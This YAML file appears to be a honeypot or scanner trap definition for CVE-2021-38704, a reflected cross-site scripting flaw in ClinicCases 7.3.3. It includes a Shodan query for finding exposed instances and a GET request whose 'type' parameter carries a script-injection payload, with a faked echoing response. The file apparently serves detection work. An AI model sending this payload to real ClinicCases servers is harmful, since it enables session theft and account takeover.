id: CVE-2021-38704
info:
  name: ClinicCases 7.3.3 Cross-Site Scripting
  author: alph4byt3
  description: ClinicCases 7.3.3 is susceptible to multiple reflected cross-site scripting
    vulnerabilities that could allow unauthenticated attackers to introduce arbitrary
    JavaScript by crafting a malicious URL. This can result in account takeover via
    session token theft.
  severity: medium
  impact: 'Successful exploitation of this vulnerability could allow an attacker to
    execute malicious scripts in the context of the victim''s browser, leading to
    potential data theft, session hijacking, or defacement of the affected website.

    '
  remediation: 'To mitigate this vulnerability, it is recommended to implement proper
    input validation and sanitization techniques to prevent the execution of malicious
    scripts.

    '
  reference:
  - https://github.com/sudonoodle/CVE-2021-38704
  - https://nvd.nist.gov/vuln/detail/CVE-2021-38704
  - https://github.com/judsonmitchell/ClinicCases/releases
  - https://github.com/ARPSyndicate/cvemon
  - https://github.com/ARPSyndicate/kenzer-templates
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 6.1
    cve-id: CVE-2021-38704
    cwe-id: CWE-79
    epss-score: 0.00141
    epss-percentile: 0.48901
    cpe: cpe:2.3:a:cliniccases:cliniccases:7.3.3:*:*:*:*:*:*:*
  metadata:
    max-request: 1
    vendor: cliniccases
    product: cliniccases
    shodan-query: http.title:"ClinicCases",html:"/cliniccases/"
  tags: cve,cve2021,xss,cliniccases
traps:
- request:
    method: GET
    path: /cliniccases/lib/php/data/messages_load.php?type=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
    headers: null
    body: null
  response:
    status_code: 200
    headers:
      VulTrap: text/html
    body: </script><script>alert(document.domain)</script>
